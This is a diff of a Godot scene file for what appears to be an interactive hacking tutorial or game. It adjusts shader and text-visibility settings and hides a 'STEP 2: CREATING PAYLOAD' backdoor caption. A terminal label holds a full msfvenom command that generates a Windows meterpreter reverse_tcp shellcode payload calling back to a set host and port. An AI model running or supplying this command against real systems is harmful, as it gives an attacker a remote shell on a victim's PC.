@@ -48,8 +48,8 @@ void fragment() {
 [sub_resource type="ShaderMaterial" id="ShaderMaterial_irnc6"]
 shader = SubResource("Shader_pajh4")
 shader_parameter/rect_color = Color(0, 0, 0, 0.607843)
-shader_parameter/hole_position = Vector2(2.18, 0.495)
-shader_parameter/hole_size = Vector2(0.585, 0.33)
+shader_parameter/hole_position = Vector2(0.025, 0.605)
+shader_parameter/hole_size = Vector2(1.2, 0.33)
 
 [sub_resource type="Animation" id="Animation_cbi8u"]
 length = 0.001
@@ -4134,8 +4134,8 @@ size_flags_vertical = 0
 text = "root@DESKTOP-123ABC:~$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.102  LPORT=8000 
 --platform windows --arch x86 -e x86/shikata_ga_nai -f c -o shellcode.txt"
 autowrap_mode = 2
-visible_characters = 0
-visible_ratio = 0.0
+visible_characters = 500
+visible_ratio = 2.8735633
 metadata/_edit_use_anchors_ = true
 
 [node name="Overlay" type="ColorRect" parent="WindowContainer/Terminal/ColorRect"]
@@ -4149,22 +4149,21 @@ grow_vertical = 2
 mouse_filter = 2
 
 [node name="Label" type="Label" parent="WindowContainer/Terminal"]
+visible = false
 layout_mode = 1
 anchors_preset = -1
 anchor_left = 0.097087376
 anchor_top = 0.220339
 anchor_right = 0.89320385
 anchor_bottom = 0.88771194
-theme_override_font_sizes/font_size = 36
-text = "STEP 2:
-CREATING PAYLOAD
-
-creating a payload that will open a backdoor to the victim's PC"
+offset_left = 400.00003
+offset_top = 192.0
+offset_right = 400.0
+offset_bottom = 192.0
+theme_override_font_sizes/font_size = 1
 horizontal_alignment = 1
 vertical_alignment = 1
 autowrap_mode = 2
-visible_characters = 0
-visible_ratio = 0.0
 metadata/_edit_use_anchors_ = true
 
 [node name="generating exe" parent="WindowContainer/Terminal" instance=ExtResource("11_csfkx")]
